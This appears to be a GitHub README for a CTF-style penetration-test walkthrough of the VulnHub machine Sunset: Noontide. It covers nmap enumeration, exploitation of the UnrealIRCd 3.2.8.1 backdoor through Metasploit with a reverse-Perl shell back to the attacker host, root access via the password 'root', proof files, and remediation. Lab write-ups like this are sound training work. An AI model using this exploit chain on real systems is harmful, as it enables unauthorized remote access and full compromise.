# Sunset: Noontide — Penetration Testing

A professional penetration testing assessment and CTF walkthrough of **Sunset: Noontide**, an intentionally vulnerable machine from **VulnHub**.

This project documents the complete penetration testing lifecycle, including reconnaissance, service enumeration, vulnerability research, exploitation, initial access, post-exploitation, privilege escalation, proof-of-compromise, risk assessment, MITRE ATT&CK mapping, and remediation.

> ⚠️ **Disclaimer:** This assessment was performed against an intentionally vulnerable machine in an authorized laboratory environment. The techniques and commands documented here are intended only for systems for which explicit authorization has been obtained.

---

## 🎯 Objectives

- Identify the target host
- Enumerate exposed services
- Identify vulnerable software and versions
- Research applicable vulnerabilities
- Exploit the vulnerable service
- Obtain initial shell access
- Perform Linux post-exploitation enumeration
- Identify privilege escalation opportunities
- Obtain root-level access
- Recover user and root proof files
- Document security findings
- Provide remediation recommendations

---

## 🖥️ Lab Environment

| Component | Details |
|---|---|
| Target | Sunset: Noontide |
| Platform | VulnHub |
| Target IP | `10.106.186.186` |
| Target Hostname | `noontide` |
| Target OS | Debian GNU/Linux 10 (Buster) |
| Architecture | x86_64 |
| Attacker Platform | Kali Linux |
| Attacker IP | `10.106.186.204` |
| Assessment Type | Authorized Laboratory Assessment |
| Overall Risk | **CRITICAL** |
| Assessment Result | **Full System Compromise** |

---

## 🔐 Attack Chain

**Target Discovery → Nmap Enumeration → UnrealIRCd 3.2.8.1 Identified → SearchSploit → CVE-2010-2075 Identified → Metasploit Exploitation → Remote Command Shell → Shell as `server` → Linux Post-Exploitation → Weak Root Credential → `su root` → UID 0 / Root Access → User & Root Proof Files**

---

# 1. Reconnaissance

Initial network discovery was performed to identify the vulnerable target.

The target was ultimately identified as:

`10.106.186.186`

During reconnaissance, `10.106.186.142` was identified as the default gateway rather than the intended target.

This highlights the importance of correctly identifying the target before performing further security testing, particularly in a bridged or shared laboratory network.

---

# 2. Service Enumeration

Nmap service and version detection was performed against the target using:

`nmap -sV 10.106.186.186`

The significant exposed service identified during the assessment was:

`6667/tcp    open    irc    UnrealIRCd`

A more detailed scan was then performed using:

`nmap -sC -sV -Pn -p 6667 10.106.186.186`

The service was identified as:

`UnrealIRCd 3.2.8.1`

The IRC service also reported:

`irc.foonet.com`

The exposed UnrealIRCd service became the primary attack surface investigated during the assessment.

---

# 3. Vulnerability Research

SearchSploit was used to investigate publicly documented vulnerabilities associated with the discovered UnrealIRCd version.

Command:

`searchsploit UnrealIRCd 3.2.8.1`

The relevant result was:

`UnrealIRCd 3.2.8.1 - Backdoor Command Exec`

`linux/remote/16922.rb`

The vulnerability was identified as:

**CVE-2010-2075**

### Vulnerability

**UnrealIRCd 3.2.8.1 Backdoor Command Execution**

### Severity

**Critical**

### Attack Type

**Remote Command Execution**

### Security Impact

Successful exploitation of the vulnerable service allows an attacker to execute commands remotely on the target system.

---

# 4. Metasploit Exploitation

The vulnerable IRC service was exploited using the Metasploit Framework.

The selected module was:

`exploit/unix/irc/unreal_ircd_3281_backdoor`

Example configuration:

`use exploit/unix/irc/unreal_ircd_3281_backdoor`

`set RHOST 10.106.186.186`

Initial payload attempts did not produce a usable session.

A compatible Unix reverse-Perl payload was subsequently selected:

`set payload cmd/unix/reverse_perl`

`set LHOST 10.106.186.204`

`set LPORT 4444`

`run`

Metasploit reported that the target appeared vulnerable and successfully opened a command-shell session.

---

# 5. Initial Access

The obtained shell was verified using:

`whoami`

Result:

`server`

This confirmed successful remote command execution as the `server` account.

The initial working directory was:

`/home/server/irc/Unreal3.2`

At this stage, the assessment progressed from remote service exploitation to local post-exploitation enumeration.

---

# 6. Post-Exploitation Enumeration

After obtaining the shell, standard Linux enumeration was performed to understand the compromised host and identify potential privilege escalation paths.

## Current User

Command:

`id`

Result:

`uid=1000(server) gid=1000(server)`

The account was a non-root user.

## Hostname

Command:

`hostname`

Result:

`noontide`

## Kernel Information

Command:

`uname -a`

Result:

`Linux noontide 4.19.0-10-amd64 x86_64`

## Operating System

Command:

`cat /etc/os-release`

Result:

`Debian GNU/Linux 10 (buster)`

These commands established the current identity, hostname, kernel version, operating system, and general system configuration.

---

# 7. Privilege Escalation Enumeration

Several standard Linux privilege escalation checks were performed.

## 7.1 SUID Enumeration

Command:

`find / -perm -4000 -type f 2>/dev/null`

Standard SUID binaries such as `passwd`, `chsh`, `mount`, `umount`, `su`, `chfn`, `newgrp`, and `gpasswd` were identified.

No obvious custom or anomalous SUID binary was identified as the successful escalation vector.

---

## 7.2 Sudo Enumeration

Command:

`sudo -l`

No useful sudo-based privilege escalation path was identified from the available output.

---

## 7.3 Cron Enumeration

Commands:

`cat /etc/crontab`

`ls -la /etc/cron.d/`

`ls -la /etc/cron.hourly/`

`ls -la /etc/cron.daily/`

`ls -la /etc/cron.weekly/`

The observed scheduled jobs were standard Debian-style system jobs.

No obvious writable root cron job was identified.

---

## 7.4 Writable File Enumeration

Command:

`find / -writable -type f 2>/dev/null | head -100`

The initial results were primarily `/proc` pseudo-files and did not reveal a practical privilege escalation vector.

---

## 7.5 Linux Capabilities

Command:

`getcap -r / 2>/dev/null`

No useful capability-based privilege escalation was identified from the resulting output.

---

# 8. Privilege Escalation

The successful privilege escalation path was based on the intentionally weak root credentials configured on the vulnerable machine.

The root account was accessed using:

`su root`

Password:

`root`

Root access was then verified using:

`id`

Result:

`uid=0(root) gid=0(root) groups=0(root)`

The identity was also confirmed using:

`whoami`

Result:

`root`

This confirmed complete administrative control of the target system.

---

# 9. Proof of Compromise

## 9.1 User-Level Proof

The user-level proof file was located at:

`/home/server/local.txt`

Command:

`cat /home/server/local.txt`

Result:

`c53c08b5bf2b0801c5d0c24149826a6e`

---

## 9.2 Root-Level Proof

The root-level proof file was located at:

`/root/proof.txt`

Command:

`cat /root/proof.txt`

Result:

`ab28c8ca8da1b9ffc2d702ac54221105`

The root proof also returned:

`Thanks for playing! - Felipe Winsnes (@whitecr0wz)`

The recovery of both proof files confirms successful compromise from initial remote access through root-level control.

---

# 10. Risk Summary

| ID | Finding | Severity | Impact |
|---|---|---|---|
| VULN-01 | UnrealIRCd 3.2.8.1 Backdoor | 🔴 Critical | Remote Command Execution |
| VULN-02 | Weak Root Credentials | 🔴 Critical | Complete Administrative Compromise |

---

# 11. Detailed Findings

## VULN-01 — UnrealIRCd 3.2.8.1 Backdoor

**Severity:** Critical

**Affected Service:** IRC / TCP 6667

**Affected Software:** UnrealIRCd 3.2.8.1

**CVE:** CVE-2010-2075

**Attack Type:** Remote Command Execution

**Observed Impact:** Remote shell obtained as `server`

### Description

The exposed UnrealIRCd service was running a vulnerable version associated with a known backdoor command-execution vulnerability.

The vulnerability was identified through service enumeration and SearchSploit research and was successfully exploited using Metasploit.

### Business Impact

An attacker able to reach the vulnerable IRC service could execute commands remotely and obtain unauthorized access to the host.

---

## VULN-02 — Weak Root Credentials

**Severity:** Critical

**Affected Account:** `root`

**Observed Credential:** `root / root`

**Observed Impact:** UID 0 administrative access

### Description

The root account was configured with an extremely weak credential.

After obtaining a local shell as `server`, the root account was accessed using the weak credential and verified with UID 0.

### Business Impact

An attacker who obtains local shell access can use the weak root credential to obtain complete control of the operating system.

---

# 12. MITRE ATT&CK Mapping

| Technique | ID | Observed Activity |
|---|---|---|
| Network Service Scanning | T1046 | Nmap enumeration |
| Exploit Public-Facing Application | T1190 | Exploitation of exposed UnrealIRCd service |
| Command and Scripting Interpreter | T1059 | Remote command shell |
| Valid Accounts | T1078 | Use of root credentials |
| Account Discovery | T1087 | Identity and user enumeration |
| System Information Discovery | T1082 | `uname` and `/etc/os-release` |
| File and Directory Discovery | T1083 | Filesystem enumeration |
| Scheduled Task/Job Discovery | T1053 | Cron enumeration |
| Permission Groups Discovery | T1069 | `id` and group enumeration |

---

# 13. Remediation Recommendations

## 13.1 Remove or Upgrade UnrealIRCd

Replace the vulnerable UnrealIRCd installation with a trusted and supported release.

Verify software integrity and package provenance before deployment.

## 13.2 Remove Backdoored Software

If software integrity or provenance is uncertain, rebuild the system using trusted installation media and verified packages.

## 13.3 Eliminate Weak Credentials

Replace default and weak credentials with strong, unique administrative credentials.

Do not use simple passwords such as `root`.

## 13.4 Restrict IRC Exposure

If IRC is required, restrict access using:

- Firewall rules
- Network segmentation
- VPN access
- Source-IP restrictions

## 13.5 Apply Security Updates

Maintain a documented patch-management process for the operating system and all exposed services.

## 13.6 Monitor Privileged Access

Log and review:

- Administrative authentication
- Root access
- Privilege changes
- Suspicious authentication activity

---

# 14. Penetration Testing Methodology

| Phase | Activities |
|---|---|
| Reconnaissance | Network discovery and target identification |
| Enumeration | Nmap service/version detection |
| Vulnerability Research | SearchSploit and Metasploit module identification |
| Exploitation | UnrealIRCd backdoor exploitation |
| Initial Access | Command shell as `server` |
| Post-Exploitation | Identity, OS, filesystem and privilege enumeration |
| Privilege Escalation | SUID, sudo, cron, writable-file and capability checks |
| Evidence Collection | User and root proof files |
| Reporting | Findings, risk analysis and remediation |

---

# 15. Tools Used

- **Nmap** — Network discovery and service enumeration
- **SearchSploit** — Vulnerability and exploit research
- **Metasploit Framework** — Exploitation and session establishment
- **Linux Command-Line Utilities** — Post-exploitation and privilege enumeration

---

# 16. Skills Demonstrated

- Network Reconnaissance
- Host Discovery
- Port Scanning
- Service Enumeration
- Version Identification
- Vulnerability Assessment
- CVE Research
- SearchSploit
- Metasploit Framework
- Remote Command Execution
- Linux Enumeration
- SUID Enumeration
- Sudo Enumeration
- Cron Enumeration
- Writable File Enumeration
- Linux Capabilities
- Credential Security Assessment
- Privilege Escalation
- Proof-of-Compromise
- MITRE ATT&CK Mapping
- Risk Assessment
- Security Reporting
- Remediation Analysis

---

# 17. Final Assessment

The **Sunset: Noontide** host was successfully compromised from initial network access through complete root-level control.

The primary initial-access vulnerability was the **UnrealIRCd 3.2.8.1 backdoor (CVE-2010-2075)**.

The vulnerability provided remote command execution and resulted in an initial shell as the `server` account.

Post-exploitation enumeration was then performed, including SUID, sudo, cron, writable-file, Linux capability, identity, operating-system, and filesystem checks.

These checks did not identify the successful escalation route.

Full administrative access was ultimately achieved through the machine's weak root credentials.

The successful recovery of both the user-level and root-level proof files confirmed complete system compromise.

### Overall Assessment

**CRITICAL — Full System Compromise Achieved**

---

# 18. Assessment Results

| Objective | Status |
|---|---|
| Target Identified | ✅ PASS |
| Exposed Service Identified | ✅ PASS |
| Vulnerable Version Identified | ✅ PASS |
| CVE Identified | ✅ PASS |
| Remote Command Execution | ✅ PASS |
| Initial Shell as `server` | ✅ PASS |
| User Proof Recovered | ✅ PASS |
| Privilege Escalation | ✅ PASS |
| Root Access Verified | ✅ PASS |
| Root Proof Recovered | ✅ PASS |

---

# 19. Professional Penetration Testing Report

A detailed professional penetration testing report is included with this project:

**`Sunset-Noontide-Penetration-Testing-Report.pdf`**

The report contains:

- Executive Summary
- Document Control
- Scope and Rules of Engagement
- Risk Summary
- Attack Path
- Reconnaissance
- Service Enumeration
- Vulnerability Research
- Metasploit Exploitation
- Initial Access
- Post-Exploitation
- Privilege Escalation
- Evidence and Proof Files
- Detailed Findings
- MITRE ATT&CK Mapping
- Remediation Recommendations
- Final Assessment

---

# 20. Evidence

Suggested repository structure:

`sunset-noontide-pentesting/`

`├── README.md`

`├── Sunset-Noontide-Penetration-Testing-Report.pdf`

`└── evidence/`

`    ├── 01-target-discovery.png`

`    ├── 02-nmap-enumeration.png`

`    ├── 03-searchsploit.png`

`    ├── 04-metasploit-exploitation.png`

`    ├── 05-initial-shell.png`

`    ├── 06-post-exploitation.png`

`    ├── 07-privilege-escalation.png`

`    └── 08-root-proof.png`

Screenshots should contain only information from the authorized laboratory environment.

---

# 21. Lessons Learned

This assessment provided practical experience in:

1. Correctly identifying the intended target in a network environment.
2. Performing service and version enumeration with Nmap.
3. Researching vulnerabilities using SearchSploit.
4. Selecting an appropriate Metasploit exploit module.
5. Troubleshooting payload compatibility.
6. Establishing a remote command shell.
7. Performing Linux post-exploitation enumeration.
8. Systematically checking common privilege escalation vectors.
9. Identifying weak administrative credentials.
10. Verifying root-level compromise.
11. Collecting proof-of-compromise evidence.
12. Documenting vulnerabilities in a professional penetration testing format.

---

# 22. ⚠️ Legal & Ethical Disclaimer

This repository is intended strictly for:

- Cybersecurity education
- Authorized penetration testing
- CTF practice
- Vulnerability research
- Laboratory environments

The techniques documented in this repository must only be performed against systems for which explicit authorization has been obtained.

Do not use these techniques against production systems, public infrastructure, or third-party systems without permission.

---

# 👨‍💻 Author

**Alen Sales K S**

Cybersecurity | Penetration Testing | SOC | Network Security

GitHub: https://github.com/zales2004

---

# ⭐ Project Summary

**Sunset: Noontide** demonstrates a complete penetration testing workflow:

**Reconnaissance → Enumeration → Vulnerability Research → Exploitation → Initial Access → Post-Exploitation → Privilege Escalation → Root Access → Evidence Collection → Risk Assessment → Security Reporting**

**Assessment Result: CRITICAL — Full System Compromise Achieved**


---

## Portfolio navigation

This repository is part of my hands-on cybersecurity learning portfolio by **Alen Sales K S**. I document lab work to make the methodology, evidence, limitations, and lessons learned easier to review.

- [Cybersploit 1 CTF Walkthrough](https://github.com/zales2004/cybersploit-1-ctf-walkthrough)
- [Cybersploit 2 CTF Walkthrough](https://github.com/zales2004/cybersploit-2-ctf-walkthrough)
- [Metasploitable 2 Lab](https://github.com/zales2004/metasploitable-2-ctf-walkthrough)

## Scope and responsible use

All security testing described here is for authorized training environments, intentionally vulnerable targets, or systems I own or have permission to assess. Findings should be interpreted in the context of the documented lab and supporting evidence; they should not be treated as proof of compromise on unrelated real-world systems.
